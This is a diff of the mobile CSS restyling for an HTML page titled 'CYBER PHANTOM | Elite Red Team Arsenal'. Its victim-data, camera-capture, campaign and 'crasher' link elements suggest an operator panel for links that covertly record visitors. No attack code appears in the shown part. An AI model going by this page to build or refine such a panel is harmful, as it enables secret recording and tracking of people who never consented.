@@ -2,7 +2,7 @@
 <html lang="bn">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>CYBER PHANTOM | Elite Red Team Arsenal</title>
     <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
@@ -13,9 +13,6 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/recordrtc/5.6.2/RecordRTC.js"></script>
     <!-- Chart.js -->
     <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
-    <!-- Leaflet -->
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
-    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <!-- Font Awesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <!-- Google Fonts -->
@@ -31,11 +28,11 @@
             --success: #00ff9d;
             --dark: #0a0a0f;
             --darker: #050508;
-            --card-bg: rgba(20, 20, 30, 0.6);
-            --glass: rgba(255, 255, 255, 0.03);
-            --border: rgba(0, 240, 255, 0.15);
-            --glow: 0 0 40px rgba(0, 240, 255, 0.15);
-            --glow-red: 0 0 40px rgba(255, 56, 100, 0.2);
+            --card-bg: rgba(20, 20, 30, 0.8);
+            --glass: rgba(255, 255, 255, 0.05);
+            --border: rgba(0, 240, 255, 0.2);
+            --glow: 0 0 30px rgba(0, 240, 255, 0.2);
+            --glow-red: 0 0 30px rgba(255, 56, 100, 0.3);
             --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
         }
         
@@ -43,6 +40,11 @@
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        html {
+            font-size: 16px;
         }
         
         body {
@@ -52,7 +54,7 @@
             color: #e8e8e8;
             overflow-x: hidden;
             position: relative;
-            line-height: 1.6;
+            line-height: 1.5;
         }
         
         /* Animated Background */
@@ -115,7 +117,7 @@
         .container {
             max-width: 1400px;
             margin: 0 auto;
-            padding: 2rem;
+            padding: 1rem;
             position: relative;
             z-index: 10;
         }
@@ -126,17 +128,24 @@
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
             border: 1px solid var(--border);
-            border-radius: 24px;
-            padding: 1.5rem 2.5rem;
-            margin-bottom: 2rem;
+            border-radius: 20px;
+            padding: 1rem;
+            margin-bottom: 1rem;
             display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 1.5rem;
+            flex-direction: column;
+            gap: 1rem;
             box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4), var(--glow);
             position: relative;
             overflow: hidden;
+        }
+        
+        @media (min-width: 768px) {
+            .header {
+                flex-direction: row;
+                justify-content: space-between;
+                align-items: center;
+                padding: 1.2rem 1.5rem;
+            }
         }
         
         .header::before {
@@ -158,88 +167,78 @@
         .logo-section {
             display: flex;
             align-items: center;
-            gap: 1.2rem;
+            gap: 0.8rem;
         }
         
         .logo-icon {
-            width: 60px;
-            height: 60px;
+            width: 50px;
+            height: 50px;
             background: linear-gradient(135deg, var(--primary), var(--accent));
-            border-radius: 16px;
+            border-radius: 12px;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 1.8rem;
+            font-size: 1.5rem;
             color: var(--dark);
-            box-shadow: 0 0 30px rgba(0, 240, 255, 0.4);
+            box-shadow: 0 0 20px rgba(0, 240, 255, 0.4);
             animation: pulse 3s ease-in-out infinite;
-            position: relative;
-        }
-        
-        .logo-icon::after {
-            content: '';
-            position: absolute;
-            inset: -2px;
-            border-radius: 18px;
-            background: linear-gradient(135deg, var(--primary), var(--accent), var(--secondary));
-            z-index: -1;
-            opacity: 0.6;
-            animation: rotate 3s linear infinite;
-            filter: blur(8px);
-        }
-        
-        @keyframes rotate {
-            0% { filter: hue-rotate(0deg) blur(8px); }
-            100% { filter: hue-rotate(360deg) blur(8px); }
+            flex-shrink: 0;
         }
         
         @keyframes pulse {
-            0%, 100% { transform: scale(1); box-shadow: 0 0 30px rgba(0, 240, 255, 0.4); }
-            50% { transform: scale(1.02); box-shadow: 0 0 50px rgba(0, 240, 255, 0.6); }
+            0%, 100% { transform: scale(1); box-shadow: 0 0 20px rgba(0, 240, 255, 0.4); }
+            50% { transform: scale(1.02); box-shadow: 0 0 30px rgba(0, 240, 255, 0.6); }
         }
         
         .logo-text h1 {
             font-family: 'JetBrains Mono', monospace;
-            font-size: 1.8rem;
+            font-size: 1.2rem;
             font-weight: 700;
             background: linear-gradient(135deg, #fff 0%, var(--primary) 50%, var(--accent) 100%);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             text-transform: uppercase;
-            letter-spacing: 2px;
+            letter-spacing: 1px;
         }
         
         .logo-text p {
-            font-size: 0.8rem;
+            font-size: 0.7rem;
             color: rgba(0, 240, 255, 0.7);
-            letter-spacing: 4px;
+            letter-spacing: 2px;
             text-transform: uppercase;
             font-weight: 500;
-            margin-top: 0.2rem;
         }
         
         .operator-badge {
             background: var(--glass);
             border: 1px solid var(--border);
-            border-radius: 16px;
-            padding: 1rem 1.5rem;
+            border-radius: 12px;
+            padding: 0.8rem 1rem;
             display: flex;
             align-items: center;
-            gap: 1rem;
+            gap: 0.8rem;
             backdrop-filter: blur(10px);
+            align-self: flex-start;
+        }
+        
+        @media (min-width: 768px) {
+            .operator-badge {
+                align-self: center;
+            }
         }
         
         .operator-icon {
-            width: 44px;
-            height: 44px;
+            width: 40px;
+            height: 40px;
             background: linear-gradient(135deg, rgba(0, 240, 255, 0.2), rgba(112, 0, 255, 0.2));
-            border-radius: 12px;
+            border-radius: 10px;
             display: flex;
             align-items: center;
             justify-content: center;
             color: var(--primary);
-            font-size: 1.1rem;
+            font-size: 1rem;
             border: 1px solid var(--border);
+            flex-shrink: 0;
         }
         
         .operator-info {
@@ -248,55 +247,50 @@
         }
         
         .operator-label {
-            font-size: 0.7rem;
+            font-size: 0.65rem;
             color: rgba(0, 240, 255, 0.6);
             text-transform: uppercase;
-            letter-spacing: 2px;
+            letter-spacing: 1px;
             font-weight: 600;
         }
         
         .operator-id {
             font-family: 'JetBrains Mono', monospace;
-            font-size: 1rem;
+            font-size: 0.85rem;
             font-weight: 700;
             color: #fff;
             letter-spacing: 1px;
         }
         
-        /* Developer Badge - NEW */
+        /* Developer Badge */
         .developer-badge {
             position: fixed;
-            bottom: 30px;
-            left: 30px;
+            bottom: 20px;
+            left: 20px;
             background: linear-gradient(135deg, rgba(0, 240, 255, 0.1), rgba(112, 0, 255, 0.1));
             border: 1px solid var(--border);
-            border-radius: 20px;
-            padding: 1rem 1.5rem;
+            border-radius: 16px;
+            padding: 0.8rem 1rem;
             backdrop-filter: blur(20px);
             z-index: 1000;
             display: flex;
             align-items: center;
-            gap: 1rem;
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3), var(--glow);
-            animation: developerPulse 3s ease-in-out infinite;
-        }
-        
-        @keyframes developerPulse {
-            0%, 100% { box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3), 0 0 20px rgba(0, 240, 255, 0.2); }
-            50% { box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3), 0 0 40px rgba(0, 240, 255, 0.4); }
+            gap: 0.8rem;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.3), var(--glow);
         }
         
         .developer-icon {
-            width: 50px;
-            height: 50px;
+            width: 40px;
+            height: 40px;
             background: linear-gradient(135deg, var(--primary), var(--accent));
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 1.5rem;
+            font-size: 1.2rem;
             color: var(--dark);
-            box-shadow: 0 0 20px rgba(0, 240, 255, 0.4);
+            box-shadow: 0 0 15px rgba(0, 240, 255, 0.4);
+            flex-shrink: 0;
         }
         
         .developer-info {
@@ -305,31 +299,21 @@
         }
         
         .developer-label {
-            font-size: 0.7rem;
+            font-size: 0.65rem;
             color: rgba(0, 240, 255, 0.6);
             text-transform: uppercase;
-            letter-spacing: 2px;
+            letter-spacing: 1px;
             font-weight: 600;
         }
         
         .developer-name {
             font-family: 'JetBrains Mono', monospace;
-            font-size: 1.2rem;
+            font-size: 1rem;
             font-weight: 700;
             background: linear-gradient(135deg, #fff, var(--primary));
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             letter-spacing: 1px;
-        }
-        
-        .developer-globe {
-            display: inline-block;
-            animation: globeSpin 2s linear infinite;
-        }
-        
-        @keyframes globeSpin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
         }
         
         /* Cards */
@@ -338,13 +322,21 @@
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
             border: 1px solid var(--border);
-            border-radius: 24px;
-            padding: 2rem;
-            margin-bottom: 2rem;
+            border-radius: 20px;
+            padding: 1.2rem;
+            margin-bottom: 1rem;
             box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
             transition: var(--transition);
             position: relative;
             overflow: hidden;
+        }
+        
+        @media (min-width: 768px) {
+            .card {
+                padding: 1.5rem;
+                margin-bottom: 1.5rem;
+                border-radius: 24px;
+            }
         }
         
         .card::before {
@@ -358,67 +350,76 @@
             opacity: 0.5;
         }
         
-        .card:hover {
-            transform: translateY(-4px);
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4), var(--glow);
-            border-color: rgba(0, 240, 255, 0.3);
-        }
-        
         .card-header {
             display: flex;
             align-items: center;
-            gap: 1rem;
-            margin-bottom: 1.5rem;
-            padding-bottom: 1rem;
+            gap: 0.8rem;
+            margin-bottom: 1rem;
+            padding-bottom: 0.8rem;
             border-bottom: 1px solid rgba(0, 240, 255, 0.1);
         }
         
         .card-icon {
-            width: 48px;
-            height: 48px;
+            width: 40px;
+            height: 40px;
             background: linear-gradient(135deg, rgba(0, 240, 255, 0.15), rgba(112, 0, 255, 0.15));
-            border-radius: 14px;
+            border-radius: 12px;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 1.3rem;
+            font-size: 1.1rem;
             color: var(--primary);
             border: 1px solid var(--border);
-            transition: var(--transition);
-        }
-        
-        .card:hover .card-icon {
-            transform: rotate(5deg) scale(1.05);
-            box-shadow: 0 0 20px rgba(0, 240, 255, 0.3);
+            flex-shrink: 0;
         }
         
         .card-title {
             font-family: 'JetBrains Mono', monospace;
-            font-size: 1.3rem;
+            font-size: 1.1rem;
             font-weight: 700;
             color: #fff;
             text-transform: uppercase;
             letter-spacing: 1px;
         }
         
-        /* Feature Grid */
+        @media (min-width: 768px) {
+            .card-title {
+                font-size: 1.2rem;
+            }
+        }
+        
+        /* Feature Grid - Mobile Optimized */
         .feature-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
-            gap: 1rem;
-            margin: 1.5rem 0;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 0.6rem;
+            margin: 1rem 0;
+        }
+        
+        @media (min-width: 640px) {
+            .feature-grid {
+                grid-template-columns: repeat(3, 1fr);
+                gap: 0.8rem;
+            }
+        }
+        
+        @media (min-width: 1024px) {
+            .feature-grid {
+                grid-template-columns: repeat(4, 1fr);
+            }
         }
         
         .feature-card {
             background: var(--glass);
             border: 1px solid rgba(0, 240, 255, 0.1);
-            border-radius: 16px;
-            padding: 1.5rem 1rem;
+            border-radius: 12px;
+            padding: 1rem 0.5rem;
             text-align: center;
             cursor: pointer;
             transition: var(--transition);
             position: relative;
             overflow: hidden;
+            touch-action: manipulation;
         }
         
         .feature-card::before {
@@ -432,42 +433,46 @@
             transition: left 0.5s;
         }
         
-        .feature-card:hover::before {
+        .feature-card:hover::before,
+        .feature-card:active::before {
             left: 100%;
         }
         
         .feature-card i {
-            font-size: 1.8rem;
+            font-size: 1.4rem;
             color: var(--primary);
-            margin-bottom: 0.8rem;
+            margin-bottom: 0.5rem;
             display: block;
             transition: var(--transition);
         }
         
         .feature-card span {
-            font-size: 0.75rem;
+            font-size: 0.7rem;
             font-weight: 600;
-            color: rgba(255, 255, 255, 0.6);
+            color: rgba(255, 255, 255, 0.7);
             text-transform: uppercase;
-            letter-spacing: 1px;
+            letter-spacing: 0.5px;
             display: block;
+            line-height: 1.2;
         }
         
-        .feature-card:hover {
+        .feature-card:hover,
+        .feature-card:active {
             border-color: var(--primary);
-            transform: translateY(-3px);
-            box-shadow: 0 10px 30px rgba(0, 240, 255, 0.15);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(0, 240, 255, 0.15);
         }
         
-        .feature-card:hover i {
-            transform: scale(1.2);
+        .feature-card:hover i,
+        .feature-card:active i {
+            transform: scale(1.1);
             color: var(--accent);
         }
         
         .feature-card.selected {
-            background: linear-gradient(135deg, rgba(0, 240, 255, 0.2), rgba(112, 0, 255, 0.1));
+            background: linear-gradient(135deg, rgba(0, 240, 255, 0.25), rgba(112, 0, 255, 0.15));
             border-color: var(--primary);
-            box-shadow: 0 0 30px rgba(0, 240, 255, 0.2);
+            box-shadow: 0 0 20px rgba(0, 240, 255, 0.25);
         }
         
         .feature-card.selected i {
@@ -482,24 +487,19 @@
         .toggle-container {
             display: flex;
             align-items: center;
-            gap: 1rem;
-            padding: 1rem 1.2rem;
+            gap: 0.8rem;
+            padding: 0.8rem;
             background: var(--glass);
-            border-radius: 16px;
-            margin: 1rem 0;
+            border-radius: 12px;
+            margin: 0.8rem 0;
             border: 1px solid rgba(0, 240, 255, 0.1);
-            transition: var(--transition);
-        }
-        
-        .toggle-container:hover {
-            border-color: rgba(0, 240, 255, 0.2);
-            background: rgba(0, 240, 255, 0.05);
         }
         
         .toggle-switch {
             position: relative;
-            width: 56px;
-            height: 30px;
+            width: 50px;
+            height: 26px;
+            flex-shrink: 0;
         }
         
         .toggle-switch input {
@@ -516,7 +516,7 @@
             right: 0;
             bottom: 0;
             background: rgba(255,255,255,0.1);
-            border-radius: 30px;
+            border-radius: 26px;
             transition: 0.3s;
             border: 1px solid rgba(0, 240, 255, 0.2);
         }
@@ -524,14 +524,14 @@
         .toggle-slider::before {
             position: absolute;
             content: "";
-            height: 24px;
-            width: 24px;
-            left: 3px;
+            height: 20px;
+            width: 20px;
+            left: 2px;
             bottom: 2px;
             background: linear-gradient(135deg, #fff, #e0e0e0);
             border-radius: 50%;
             transition: 0.3s;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.3);
+            box-shadow: 0 2px 6px rgba(0,0,0,0.3);
         }
         
         input:checked + .toggle-slider {
@@ -540,30 +540,28 @@
         }
         
         input:checked + .toggle-slider::before {
-            transform: translateX(26px);
-            background: #fff;
+            transform: translateX(24px);
         }
         
         .toggle-label {
-            font-size: 0.9rem;
-            color: rgba(255, 255, 255, 0.8);
+            font-size: 0.85rem;
+            color: rgba(255, 255, 255, 0.9);
             font-weight: 500;
-            letter-spacing: 0.5px;
         }
         
         .toggle-label i {
             color: var(--primary);
-            margin-right: 0.6rem;
-            width: 20px;
+            margin-right: 0.4rem;
+            width: 18px;
         }
         
         /* Custom Camera Settings */
         .camera-custom {
             display: none;
-            margin-top: 1.5rem;
-            padding: 1.5rem;
+            margin-top: 1rem;
+            padding: 1rem;
             background: var(--glass);
-            border-radius: 16px;
+            border-radius: 12px;
             border: 1px solid var(--border);
         }
         
@@ -579,229 +577,143 @@
         
         .camera-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 1.5rem;
+            grid-template-columns: 1fr;
+            gap: 1rem;
+        }
+        
+        @media (min-width: 640px) {
+            .camera-grid {
+                grid-template-columns: repeat(3, 1fr);
+            }
         }
         
         .input-group {
             display: flex;
             flex-direction: column;
-            gap: 0.6rem;
+            gap: 0.4rem;
         }
         
         .input-group label {
-            font-size: 0.8rem;
+            font-size: 0.75rem;
             color: var(--primary);
             font-weight: 600;
             text-transform: uppercase;
-            letter-spacing: 1px;
+            letter-spacing: 0.5px;
         }
         
         .input-group input, .input-group select {
-            padding: 0.9rem 1rem;
-            border-radius: 12px;
+            padding: 0.7rem 0.8rem;
+            border-radius: 10px;
             border: 1px solid rgba(0, 240, 255, 0.2);
             background: rgba(0,0,0,0.3);
             color: #fff;
             font-family: 'Inter', sans-serif;
-            font-size: 1rem;
+            font-size: 0.95rem;
             font-weight: 500;
-            transition: var(--transition);
+            width: 100%;
         }
         
         .input-group input:focus, .input-group select:focus {
             outline: none;
             border-color: var(--primary);
-            box-shadow: 0 0 20px rgba(0, 240, 255, 0.1);
-            transform: translateY(-1px);
+            box-shadow: 0 0 15px rgba(0, 240, 255, 0.1);
         }
         
         /* URL Input */
         .url-input-group {
-            margin: 1.5rem 0;
+            margin: 1rem 0;
         }
         
         .url-input-group label {
             display: block;
-            font-size: 0.8rem;
+            font-size: 0.75rem;
             color: var(--primary);
-            margin-bottom: 0.6rem;
+            margin-bottom: 0.4rem;
             text-transform: uppercase;
-            letter-spacing: 1px;
+            letter-spacing: 0.5px;
             font-weight: 600;
         }
         
         .url-input {
             width: 100%;
-            padding: 1rem 1.2rem;
-            border-radius: 16px;
+            padding: 0.8rem 1rem;
+            border-radius: 12px;
             border: 1px solid rgba(0, 240, 255, 0.2);
             background: rgba(0,0,0,0.3);
             color: #fff;
             font-family: 'Inter', sans-serif;
-            font-size: 1rem;
-            font-weight: 500;
-            transition: var(--transition);
+            font-size: 0.95rem;
         }
         
         .url-input:focus {
             outline: none;
             border-color: var(--primary);
-            box-shadow: 0 0 20px rgba(0, 240, 255, 0.1);
-        }
-        
-        .url-input::placeholder {
-            color: rgba(255,255,255,0.3);
+            box-shadow: 0 0 15px rgba(0, 240, 255, 0.1);
         }
         
         /* Buttons */
-        .btn-primary {
+        .btn-primary, .btn-danger {
             width: 100%;
-            padding: 1.2rem;
-            border-radius: 16px;
+            padding: 1rem;
+            border-radius: 12px;
             border: none;
-            background: linear-gradient(135deg, var(--primary), var(--accent));
-            color: var(--dark);
             font-family: 'JetBrains Mono', monospace;
-            font-size: 1rem;
+            font-size: 0.9rem;
             font-weight: 700;
             text-transform: uppercase;
-            letter-spacing: 2px;
+            letter-spacing: 1px;
             cursor: pointer;
             transition: var(--transition);
             position: relative;
             overflow: hidden;
-            box-shadow: 0 8px 30px rgba(0, 240, 255, 0.3);
-            margin-bottom: 1rem;
+            margin-bottom: 0.8rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            touch-action: manipulation;
         }
         
-        .btn-primary::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
-            transition: left 0.5s;
-        }
-        
-        .btn-primary:hover::before {
-            left: 100%;
-        }
-        
-        .btn-primary:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 15px 40px rgba(0, 240, 255, 0.4);
-        }
-        
-        .btn-primary:active {
-            transform: translateY(0);
+        .btn-primary {
+            background: linear-gradient(135deg, var(--primary), var(--accent));
+            color: var(--dark);
+            box-shadow: 0 6px 20px rgba(0, 240, 255, 0.3);
         }
         
         .btn-danger {
-            width: 100%;
-            padding: 1.2rem;
-            border-radius: 16px;
-            border: none;
             background: linear-gradient(135deg, var(--secondary), #ff0055);
             color: #fff;
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 1rem;
-            font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            cursor: pointer;
-            transition: var(--transition);
-            position: relative;
-            overflow: hidden;
-            box-shadow: 0 8px 30px rgba(255, 56, 100, 0.3);
+            box-shadow: 0 6px 20px rgba(255, 56, 100, 0.3);
         }
         
-        .btn-danger::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
-            transition: left 0.5s;
-        }
-        
-        .btn-danger:hover::before {
-            left: 100%;
-        }
-        
-        .btn-danger:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 15px 40px rgba(255, 56, 100, 0.5);
-        }
-        
-        .btn-secondary {
-            padding: 0.8rem 1.5rem;
-            border-radius: 12px;
-            border: 1px solid var(--border);
-            background: var(--glass);
-            color: var(--primary);
-            font-family: 'Inter', sans-serif;
-            font-size: 0.9rem;
-            font-weight: 600;
-            cursor: pointer;
-            transition: var(--transition);
-            display: inline-flex;
-            align-items: center;
-            gap: 0.6rem;
-            letter-spacing: 0.5px;
-        }
-        
-        .btn-secondary:hover {
-            background: var(--primary);
-            color: var(--dark);
-            box-shadow: var(--glow);
-            transform: translateY(-2px);
-            border-color: var(--primary);
+        .btn-primary:active, .btn-danger:active {
+            transform: scale(0.98);
         }
         
         /* Link Box */
         .link-box {
-            margin-top: 1.5rem;
-            padding: 1.5rem;
-            background: linear-gradient(135deg, rgba(0, 240, 255, 0.08), rgba(112, 0, 255, 0.04));
+            margin-top: 1rem;
+            padding: 1rem;
+            background: linear-gradient(135deg, rgba(0, 240, 255, 0.1), rgba(112, 0, 255, 0.05));
             border: 1px solid var(--primary);
-            border-radius: 16px;
+            border-radius: 12px;
             position: relative;
-            overflow: hidden;
         }
         
         .link-box.danger {
-            background: linear-gradient(135deg, rgba(255, 56, 100, 0.08), rgba(255, 0, 85, 0.04));
+            background: linear-gradient(135deg, rgba(255, 56, 100, 0.1), rgba(255, 0, 85, 0.05));
             border-color: var(--secondary);
         }
         
-        .link-box::before {
-            content: '🔗';
-            position: absolute;
-            top: 50%;
-            right: 20px;
-            transform: translateY(-50%);
-            font-size: 3rem;
-            opacity: 0.05;
-        }
-        
-        .link-box.danger::before {
-            content: '⚠️';
-        }
-        
         .link-label {
-            font-size: 0.8rem;
+            font-size: 0.75rem;
             color: var(--primary);
             text-transform: uppercase;
-            letter-spacing: 2px;
-            margin-bottom: 0.6rem;
+            letter-spacing: 1px;
+            margin-bottom: 0.5rem;
             display: flex;
             align-items: center;
-            gap: 0.6rem;
+            gap: 0.4rem;
             font-weight: 600;
         }
         
@@ -811,119 +723,122 @@
         
         .link-text {
             font-family: 'JetBrains Mono', monospace;
-            font-size: 0.9rem;
+            font-size: 0.8rem;
             color: #fff;
             background: rgba(0,0,0,0.4);
-            padding: 1rem;
-            border-radius: 12px;
+            padding: 0.8rem;
+            border-radius: 8px;
             word-break: break-all;
             border: 1px solid rgba(0, 240, 255, 0.1);
-            line-height: 1.5;
+            line-height: 1.4;
+            max-height: 100px;
+            overflow-y: auto;
         }
         
-        .link-box.danger .link-text {
-            border-color: rgba(255, 56, 100, 0.2);
+        .btn-secondary {
+            padding: 0.6rem 1rem;
+            border-radius: 10px;
+            border: 1px solid var(--border);
+            background: var(--glass);
+            color: var(--primary);
+            font-family: 'Inter', sans-serif;
+            font-size: 0.85rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: var(--transition);
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.4rem;
+            width: 100%;
+            margin-top: 0.5rem;
+        }
+        
+        .btn-secondary:active {
+            background: var(--primary);
+            color: var(--dark);
         }
         
         /* Stats Grid */
         .stats-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 1.5rem;
-            margin-bottom: 1.5rem;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 0.8rem;
+            margin-bottom: 1rem;
+        }
+        
+        @media (min-width: 768px) {
+            .stats-grid {
+                grid-template-columns: repeat(3, 1fr);
+                gap: 1rem;
+            }
         }
         
         .stat-card {
             background: var(--glass);
             border: 1px solid rgba(0, 240, 255, 0.15);
-            border-radius: 20px;
-            padding: 1.5rem;
+            border-radius: 16px;
+            padding: 1rem 0.5rem;
             text-align: center;
-            transition: var(--transition);
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .stat-card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 3px;
-            background: linear-gradient(90deg, var(--primary), var(--accent));
-        }
-        
-        .stat-card:hover {
-            transform: translateY(-4px);
-            border-color: var(--primary);
-            box-shadow: 0 15px 40px rgba(0, 240, 255, 0.15);
         }
         
         .stat-icon {
-            width: 56px;
-            height: 56px;
+            width: 40px;
+            height: 40px;
             background: linear-gradient(135deg, rgba(0, 240, 255, 0.15), rgba(112, 0, 255, 0.15));
-            border-radius: 16px;
+            border-radius: 12px;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin: 0 auto 1rem;
-            font-size: 1.5rem;
+            margin: 0 auto 0.5rem;
+            font-size: 1.2rem;
             color: var(--primary);
             border: 1px solid var(--border);
-            transition: var(--transition);
-        }
-        
-        .stat-card:hover .stat-icon {
-            transform: scale(1.1);
-            box-shadow: 0 0 25px rgba(0, 240, 255, 0.3);
         }
         
         .stat-value {
             font-family: 'JetBrains Mono', monospace;
-            font-size: 2.5rem;
+            font-size: 1.5rem;
             font-weight: 700;
             color: #fff;
-            margin-bottom: 0.3rem;
+            margin-bottom: 0.2rem;
         }
         
         .stat-label {
-            font-size: 0.85rem;
+            font-size: 0.7rem;
             color: rgba(0, 240, 255, 0.7);
             text-transform: uppercase;
-            letter-spacing: 2px;
+            letter-spacing: 1px;
             font-weight: 600;
         }
         
         /* Chart Container */
         .chart-container {
             background: var(--glass);
-            border-radius: 16px;
-            padding: 1.2rem;
+            border-radius: 12px;
+            padding: 1rem;
             border: 1px solid rgba(0, 240, 255, 0.1);
-            height: 300px;
+            height: 250px;
+        }
+        
+        @media (min-width: 768px) {
+            .chart-container {
+                height: 300px;
+            }
         }
         
         /* Campaign List */
         .campaign-list {
-            max-height: 500px;
+            max-height: 400px;
             overflow-y: auto;
         }
         
         .campaign-item {
             background: var(--glass);
             border: 1px solid rgba(0, 240, 255, 0.15);
-            border-radius: 16px;
-            padding: 1.5rem;
-            margin-bottom: 1rem;
-            transition: var(--transition);
-        }
-        
-        .campaign-item:hover {
-            border-color: var(--primary);
-            box-shadow: 0 10px 30px rgba(0, 240, 255, 0.1);
-            transform: translateX(4px);
+            border-radius: 12px;
+            padding: 1rem;
+            margin-bottom: 0.8rem;
         }
         
         .campaign-item.crasher {
@@ -931,30 +846,29 @@
             background: linear-gradient(135deg, rgba(255, 56, 100, 0.05), transparent);
         }
         
-        .campaign-item.crasher:hover {
-            box-shadow: 0 10px 30px rgba(255, 56, 100, 0.15);
-            border-color: var(--secondary);
-        }
-        
         .campaign-header {
             display: flex;
-            align-items: center;
-            gap: 1rem;
-            flex-wrap: wrap;
-            margin-bottom: 1rem;
+            flex-direction: column;
+            gap: 0.8rem;
+        }
+        
+        @media (min-width: 640px) {
+            .campaign-header {
+                flex-direction: row;
+                align-items: center;
+            }
         }
         
         .campaign-link {
-            flex: 1;
-            min-width: 200px;
             font-family: 'JetBrains Mono', monospace;
-            font-size: 0.85rem;
+            font-size: 0.75rem;
             color: var(--accent);
             background: rgba(0,0,0,0.4);
-            padding: 0.8rem 1rem;
-            border-radius: 12px;
+            padding: 0.6rem;
+            border-radius: 8px;
             border: 1px solid rgba(112, 0, 255, 0.2);
             word-break: break-all;
+            line-height: 1.4;
         }
         
         .campaign-item.crasher .campaign-link {
@@ -962,19 +876,26 @@
             border-color: rgba(255, 56, 100, 0.2);
         }
         
-        .campaign-stats {
+        .campaign-actions {
             display: flex;
-            gap: 0.6rem;
+            gap: 0.5rem;
+        }
+        
+        .campaign-actions .btn-secondary {
+            width: auto;
+            margin: 0;
+            padding: 0.5rem 0.8rem;
+            font-size: 0.8rem;
         }
         
         .stat-badge {
             background: linear-gradient(135deg, var(--primary), var(--accent));
             color: var(--dark);
-            padding: 0.5rem 1rem;
+            padding: 0.4rem 0.8rem;
             border-radius: 20px;
-            font-size: 0.8rem;
+            font-size: 0.75rem;
             font-weight: 700;
-            letter-spacing: 1px;
+            white-space: nowrap;
         }
         
         .campaign-item.crasher .stat-badge {
@@ -982,180 +903,132 @@
             color: #fff;
         }
         
-        .campaign-actions {
-            display: flex;
-            gap: 0.6rem;
-        }
-        
-        /* Victim Data Tabs */
+        /* Victim Data */
         .victim-item {
             background: rgba(0,0,0,0.4);
-            border-radius: 16px;
-            padding: 1.5rem;
-            margin-top: 1rem;
+            border-radius: 12px;
+            padding: 1rem;
+            margin-top: 0.8rem;
             border: 1px solid rgba(0, 240, 255, 0.15);
         }
         
         .victim-header {
             display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 1rem;
-            padding-bottom: 1rem;
-            margin-bottom: 1rem;
+            flex-direction: column;
+            gap: 0.5rem;
+            padding-bottom: 0.8rem;
+            margin-bottom: 0.8rem;
             border-bottom: 1px solid rgba(0, 240, 255, 0.15);
+        }
+        
+        @media (min-width: 640px) {
+            .victim-header {
+                flex-direction: row;
+                justify-content: space-between;
+                align-items: center;
+            }
         }
         
         .victim-id {
             font-family: 'JetBrains Mono', monospace;
-            font-size: 1.1rem;
+            font-size: 0.9rem;
             color: var(--primary);
-            letter-spacing: 1px;
         }
         
         .victim-time {
-            font-size: 0.85rem;
+            font-size: 0.75rem;
             color: rgba(255,255,255,0.5);
-        }
-        
-        .victim-tabs {
-            display: flex;
-            gap: 0.6rem;
-            flex-wrap: wrap;
-            margin-bottom: 1rem;
-        }
-        
-        .tab-btn {
-            padding: 0.6rem 1.2rem;
-            border-radius: 25px;
-            border: 1px solid rgba(0, 240, 255, 0.2);
-            background: transparent;
-            color: rgba(255,255,255,0.6);
-            font-family: 'Inter', sans-serif;
-            font-size: 0.85rem;
-            font-weight: 600;
-            cursor: pointer;
-            transition: var(--transition);
